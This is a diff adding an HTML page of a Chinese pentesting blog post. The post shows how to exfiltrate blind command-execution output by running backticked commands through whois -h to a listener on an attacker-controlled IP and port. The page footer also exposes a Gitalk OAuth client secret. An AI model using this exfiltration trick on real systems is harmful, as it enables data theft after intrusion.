@@ -1,0 +1,257 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>渗透技巧：巧用whois外带回显命令执行结果 | KEYONE</title>
+<meta name="description" content="PenTesting&Security Research <br>
+LOVE & PEACE ❤️JUST FOR FUN" />
+<link rel="shortcut icon" href="https://hi-kk.github.io//favicon.ico?v=1563939020421">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://hi-kk.github.io//styles/main.css">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://hi-kk.github.io/">
+  <img class="avatar" src="https://hi-kk.github.io//images/avatar.png?v=1563939020421" alt="">
+  </a>
+  <h1 class="site-title">
+    KEYONE
+  </h1>
+  <p class="site-description">
+    PenTesting&Security Research <br>
+LOVE & PEACE ❤️JUST FOR FUN
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              渗透技巧：巧用whois外带回显命令执行结果
+            </h2>
+            <div class="post-info">
+              <span>
+                2019-03-05
+              </span>
+              <span>
+                1 min read
+              </span>
+              
+                <a href="https://hi-kk.github.io//tag/W0hrKvqDY" class="post-tag">
+                  # 渗透
+                </a>
+              
+                <a href="https://hi-kk.github.io//tag/NyeCpWt6rg" class="post-tag">
+                  # 命令执行
+                </a>
+              
+                <a href="https://hi-kk.github.io//tag/nfMLnOATe" class="post-tag">
+                  # 分享
+                </a>
+              
+                <a href="https://hi-kk.github.io//tag/6nBhZ7wLk" class="post-tag">
+                  # 技巧
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://hi-kk.github.io//post-images/shen-tou-ji-qiao-qiao-yong-whois-wai-dai-hui-xian-ming-ling-zhi-xing-jie-guo.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>在实战过程中，可能会遇到一些复杂的网络情况，导致需要执行的命令没办法看到返回结果，这就给后续渗透带来很大的不便，从twitter中看到一种新型的命令执行结果外带的方法，在这里分享记录一下。</p>
+<!--more-->
+<p>先看一下<code>whois</code>命令的使用介绍</p>
+<pre><code class="language-bash">root@kali:~# whois -h
+whois: 选项需要一个参数 -- h
+用法： whois 【选项】 …… 对象 …… 
+
+-h HOST, --host HOST    连接到服务器 HOST
+-p PORT, --port PORT    连接到端口 PORT
+-H                      隐藏法律声明 
+      --verbose         解释正在做什么 
+      --help            显示帮助并退出 
+      --version         输出版本信息并退出 
+
+这些标志是由 whois.ript.net 和 RIPE-like 服务器支持的： 
+ -l                     寻找有更少具体匹配的一个级别 
+-L                     寻找所有更少具体匹配的级别 
+-m                   寻找有更加具体匹配的一个级别 
+-M                   寻找有更加具体的匹配的所有级别 
+-c                     寻找包含 mnt-irt 属性的最小匹配 
+-x                     精确匹配 
+-b                     return brief IP address ranges with abuse contact
+-B                     关闭对象过滤（显示 email 地址） 
+-G                    关闭相关联对象的分组 
+-d                     返回 DNS 反解授权对象 
+-i ATTR[,ATTR]...      对特定的属性（ ATTR ）进行逆向查询 
+-T TYPE[,TYPE]...      只寻找 TYPE 的对象 
+-K                      只返回主键 
+-r                      关闭联系信息的递归查询 
+-R                     强制显示域对象的本地副本，即使 
+                         它包含引用 
+-a                     一并搜索所有的数据库镜像 
+-s SOURCE[,SOURCE]...   从 SOURCE 中搜索数据库镜像 
+-g SOURCE:FIRST-LAST   从串行的 FIRST 到 LAST 的 SOURCE 中查找更新 
+-t TYPE                 请求 TYPE 对象的模板 
+-v TYPE                 请求 TYPE 对象的详细模板 
+-q [version|sources|types]   询问制定服务器信息 
+root@kali:~#
+</code></pre>
+<p>仔细点就可以发现<code>whois</code>命令有两个参数可以连接到远程服务器<code>-h</code>和<code>-p</code><br>
+那么我们来尝试下利用<code>whois</code>命令外带回显命令执行结果<br>
+先在kali中监听一个端口用来接收回显结果</p>
+<p><img src="https://hi-kk.github.io//post-images/1563937879120.png" alt=""></p>
+<p>在ubuntu中执行命令</p>
+<pre><code class="language-bash">whois -h 192.168.159.132 -p 555 &quot;`whoami&amp;uname -a`&quot;
+</code></pre>
+<p><em>需要注意：这里使用的是反引号，这样才会在linux的bash环境执行命令，后面的双引号可带可不带</em></p>
+<p>执行后就看到命令的回显结果已经带出到kali中了<br>
+<img src="https://hi-kk.github.io//post-images/1563937905345.png" alt=""></p>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://hi-kk.github.io//post/lou-dong-shi-yan-cve-2017-16720-advantech-webaccess-yuan-cheng-ming-ling-zhi-xing-lou-dong">
+              <h3 class="post-title">
+                漏洞实验：CVE-2017-16720-Advantech WebAccess远程命令执行
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: 'ad403fd7697bade5a7db',
+    clientSecret: '79897ccf8604c3b962eb063a6eb25f322126ff91',
+    repo: 'hi-kk.github.io',
+    owner: 'hi-KK',
+    admin: ['hi-KK'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | 
+  <a class="rss" href="https://hi-kk.github.io//atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+
+  let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+  // This should probably be throttled.
+  // Especially because it triggers during smooth scrolling.
+  // https://lodash.com/docs/4.17.10#throttle
+  // You could do like...
+  // window.addEventListener("scroll", () => {
+  //    _.throttle(doThatStuff, 100);
+  // });
+  // Only not doing it here to keep this Pen dependency-free.
+
+  window.addEventListener("scroll", event => {
+    let fromTop = window.scrollY;
+
+    mainNavLinks.forEach((link, index) => {
+      let section = document.getElementById(decodeURI(link.hash).substring(1));
+      let nextSection = null
+      if (mainNavLinks[index + 1]) {
+        nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+      }
+      console.log('section.offsetHeight', section.offsetHeight);
+      if (section.offsetTop <= fromTop) {
+        if (nextSection) {
+          if (nextSection.offsetTop > fromTop) {
+            link.classList.add("current");
+          } else {
+            link.classList.remove("current");    
+          }
+        } else {
+          link.classList.add("current");
+        }
+      } else {
+        link.classList.remove("current");
+      }
+    });
+  });
+
+</script>
+
+      </div>
+    </div>
+  </body>
+</html>
